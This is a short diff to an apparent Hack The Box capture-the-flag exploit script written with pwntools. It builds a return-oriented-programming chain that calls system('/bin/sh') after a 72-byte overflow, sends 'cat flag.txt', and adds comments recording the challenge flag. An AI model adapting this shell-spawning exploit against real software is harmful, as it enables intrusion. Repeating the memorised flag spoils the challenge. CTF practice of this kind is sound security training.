@@ -112,6 +112,10 @@ rop.system(next(libc.search('/bin/sh\x00')) - 64)
 log.info("Generated ROP shell:\n" + rop.dump())
 payload = fix_buggy_rop(cyclic(72) + rop.chain())
 io.sendline(payload)
+
+# get the flag
 io.sendline("cat flag.txt")
 flag = io.recvline()
 log.success("Flag: " + flag)
+
+# flag: HTB{r0p_m3_if_y0u_c4n!}
